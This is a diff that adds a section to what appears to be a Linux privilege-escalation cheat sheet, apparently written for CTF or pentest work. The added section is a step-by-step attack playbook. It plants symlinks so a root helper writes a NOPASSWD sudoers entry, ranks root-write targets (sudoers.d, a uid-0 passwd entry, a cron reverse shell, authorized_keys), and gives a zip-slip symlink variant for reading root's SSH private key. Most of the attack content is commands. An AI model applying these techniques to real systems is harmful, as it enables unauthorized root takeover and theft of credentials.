@@ -85,6 +85,32 @@ echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su root2
 # Or blank root's x field if you can edit and no shadow
 ```
 
+### Arbitrary file write as root → symlink-follow primitives
+A root-run helper (a `sudo NOPASSWD` custom binary, a root cron, a SUID tool) that **writes/copies to an attacker-influenced destination path without `O_NOFOLLOW`** = arbitrary write as root. Plant a symlink at the destination, point it where you want, trigger the write.
+```bash
+# Pattern: tool copies <src> -> <dst> as root and follows symlinks on <dst>.
+# 1) make the payload (mode matters for sudoers: must be 0440)
+echo 'youruser ALL=(ALL) NOPASSWD:ALL' > payload; chmod 440 payload
+# 2) plant a symlink where the tool will WRITE, pointing at the target file
+ln -s /etc/sudoers.d/pwn dst_link
+# 3) run the root tool so it copies payload -> dst_link (= /etc/sudoers.d/pwn)
+#    then:
+sudo -i        # you're root
+```
+**Best write-anywhere-as-root targets** (in order of reliability):
+- `/etc/sudoers.d/pwn` → `youruser ALL=(ALL) NOPASSWD:ALL` (file MUST be mode 0440, no syntax errors). Cleanest.
+- `/etc/passwd` → append a `uid=0` user with a known hash (see above).
+- root cron (`/etc/cron.d/x`) → reverse shell on a schedule.
+- `/root/.ssh/authorized_keys` → only works if `PermitRootLogin` allows it (often disabled — don't burn time here first).
+
+**Archive-extraction variant (zip-slip / symlink-in-archive).** A root process that *extracts* an attacker-supplied `.zip`/`.tar` and preserves or follows **symlink members** gives the same primitive. Note: many libraries sanitize `../` traversal (collapsing dot segments) yet still mishandle symlink entries — so when plain `../../` is filtered, try a **symlink member** instead:
+```bash
+# source-side symlink in the archive -> arbitrary READ as root (if extraction reads the link)
+ln -s /root/.ssh/id_rsa leak; zip --symlinks evil.zip leak
+# destination-side symlink at the extract path -> arbitrary WRITE as root (sudoers.d trick above)
+```
+> Reproduce the extractor's exact behavior locally first (which lib/version, does it create real symlinks or write them as regular files?). The write-side `/etc/sudoers.d/` path lands far more often than the SSH path.
+
 ### Service / systemd / D-Bus / docker / lxd
 ```bash
 # docker group (Kobold pattern): 
